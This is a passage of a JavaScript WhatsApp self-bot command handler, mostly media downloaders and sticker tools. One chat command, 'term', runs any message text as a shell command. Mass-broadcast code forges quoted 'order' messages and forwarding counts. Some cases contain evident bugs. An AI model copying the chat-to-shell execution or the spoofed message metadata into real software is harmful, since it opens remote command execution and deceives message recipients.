    		idteam.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
          	if (!dev.key.fromMe && !isOwner) return
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!dev.key.fromMe && !isOwner) return
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *SELF-MODE* 」`)
          	break
      //********** ADD **********//
		case 'addstik':
		if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await idteam.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				idteam.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
				break
					case 'dellstik':
					if(!dev.key.fromMe & !isOwner) return reply('Only owner')
					if (!q) return reply(mess.wrongFormat)
					try {
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						setiker.splice(q,1)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						reply(`Succes delete sticker ${q}!`)
					} catch (err) {
						reply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
							case 'addimg':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await idteam.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				idteam.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: dev})
				break
				
				case 'addvid':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await idteam.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				idteam.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: dev })
				break
				
				case 'addvn':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await idteam.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				idteam.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
				break
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				idteam.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				idteam.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				idteam.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": imagenye } })
				break
				
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				idteam.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": audionye } })
				break
				
				case 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
				idteam.sendMessage(from, result, sticker,{quoted:dev})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
				idteam.sendMessage(from, buffer, image, { quoted: dev, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
				idteam.sendMessage(from, buffer, video, { quoted: dev, caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
				idteam.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true })
				} catch {
				  reply('Pack tidak terdaftar')
				}
break
 	case 'hidetag':
			if (!dev.key.fromMe & !isGroupAdmins) return reply(mess.admin)
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await idteam.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			idteam.sendMessage(from, optionshidetag, text)
			break
			
	case 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
                   case 'bc':

idteam.updatePresence(from, Presence.composing)

					if (!isOwner && !dev.key.fromMe) return reply(mess.only)

					if (args.length < 1) return reply('Teksnya?')

					anu = await idteam.chats.all()

					if (isMedia && !dev.message.videoMessage || isQuotedImage) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await idteam.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							idteam.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await idteam.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							idteam.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await idteam.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							idteam.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

					} else {

						for (let _ of anu) {

							sendMess(_.jid, `${body.slice(4)}`)

						}

						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)

					}

					break
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let media = await idteam.downloadAndSaveMediaMessage(encmedia, `./stik/${sender}`)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									idteam.sendMessage(from, fs.readFileSync(`./stik/${sender}.webp`), sticker, {quoted: dev})
									
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./stik/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./stik/${sender}.webp`)
                } else if ((isVideo && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let media = await idteam.downloadAndSaveMediaMessage(encmedia, `./stik/${sender}`)
					
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									idteam.sendMessage(from, fs.readFileSync(`./stik/${sender}.webp`), sticker, {quoted:dev})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./stik/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./stik/${sender}.webp`)
                } else {
                    reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
            
            
                break
case 'shortlink':
if (!q) return replt('Linknya mana bg?')
tod = await fetchJson(`https://idteam-api.herokuapp.com/short/tiny?url=${q}`)
reply(tod.result.link)
break
            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
                  addCmd(kodenya, q)
                  reply("_Success_")
                  } else {
                  reply('tag stickenya')
                  }
                  }
            break
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  reply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await idteam.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await idteam.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await idteam.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
	        if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await idteam.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            idteam.sendMessage(from,{url:images},image,{quoted:dev})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		idteam.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:dev,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			idteam.sendMessage(from, teks, text,{quoted:dev,detectLinks: false})                        
            })              
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    idteam.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    idteam.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	case 'term':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
    case 'join':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await idteam.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            idteam.sendMessage(from, teks, text, {quoted: fgc})
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			idteam.sendMessage(from, pingnya, text, {quoted: ftroli})
			})
			break  
    case 'totag':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            owgi = await idteam.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            owgi = await idteam.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'nulis':
    if (!q) return reply('Textnya mana gan?')
    reply(mess.wait)
    tod = await getBuffer(`https://idteam-api.herokuapp.com/nulis?text=${q}`)
    idteam.sendMessage(from, tod, image, {quoted: ftroli, caption: 'Awas ketahuan kak :v'})
    break
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
